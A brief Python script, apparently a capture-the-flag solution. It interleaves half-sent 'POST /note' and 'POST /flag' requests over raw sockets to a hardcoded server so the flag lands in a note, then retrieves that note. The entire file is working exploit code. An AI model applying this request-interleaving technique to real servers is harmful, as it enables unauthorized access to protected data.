import socket
import time
import requests


# 35.200.110.16:8080
server_address = ('35.200.110.16', 8080)

def req(header):
    sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sc.connect(server_address)
    sc.send(header.encode() + b" HTTP/1.1\r\n\r\n")

    return sc


sc1 = req('POST /note')
time.sleep(1)
sc2 = req('POST /flag')
print(sc2.recv(100))
sc1.sendall(b"hogefuga\r\n")
id = sc1.recv(100).decode().split("=")[1].split("\r")[0]
print(id)

url = f"http://{server_address[0]}:{server_address[1]}/note?id={id}"
res = requests.get(url)
print(res.text)


